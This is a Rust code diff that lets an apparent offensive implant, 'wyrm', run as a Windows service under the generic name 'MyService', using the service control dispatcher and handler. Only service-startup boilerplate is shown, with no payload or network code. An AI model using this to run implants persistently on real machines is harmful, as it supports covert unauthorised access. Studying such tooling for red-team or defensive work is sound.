@@ -7,7 +7,13 @@ use std::sync::atomic::Ordering;
 
 use entry::start_wyrm;
 use windows_sys::{
-    Win32::System::Services::{RegisterServiceCtrlHandlerW, SERVICE_CONTROL_STOP, SERVICE_RUNNING},
+    Win32::{
+        Foundation::FALSE,
+        System::Services::{
+            RegisterServiceCtrlHandlerW, SERVICE_CONTROL_STOP, SERVICE_RUNNING,
+            SERVICE_TABLE_ENTRYW, StartServiceCtrlDispatcherW,
+        },
+    },
     core::PWSTR,
     w,
 };
@@ -26,16 +32,20 @@ mod wyrm;
 
 #[unsafe(no_mangle)]
 pub unsafe extern "system" fn ServiceMain(_: u32, _: *mut PWSTR) {
-    // register the service with SCM (service control manager)
+    svc_start();
+}
+
+fn svc_start() {
+    // register the service with SCM
     let h_svc = unsafe { RegisterServiceCtrlHandlerW(w!("MyService"), Some(service_handler)) };
     if h_svc.is_null() {
-        panic!()
+        return;
     }
-
-    unsafe { update_service_status(h_svc, SERVICE_RUNNING) }
 
     IS_IMPLANT_SVC.store(true, Ordering::SeqCst);
     SERVICE_HANDLE.store(h_svc, Ordering::SeqCst);
+
+    unsafe { update_service_status(h_svc, SERVICE_RUNNING) }
 
     start_wyrm();
 }
@@ -50,5 +60,19 @@ unsafe extern "system" fn service_handler(control: u32) {
 }
 
 fn main() {
-    start_wyrm();
+    let mut service_name: Vec<u16> = "MyService\0".encode_utf16().collect();
+
+    let service_table = [
+        SERVICE_TABLE_ENTRYW {
+            lpServiceName: PWSTR::from(service_name.as_mut_ptr()),
+            lpServiceProc: Some(ServiceMain),
+        },
+        SERVICE_TABLE_ENTRYW::default(),
+    ];
+
+    unsafe {
+        if StartServiceCtrlDispatcherW(service_table.as_ptr()) == FALSE {
+            return;
+        }
+    }
 }
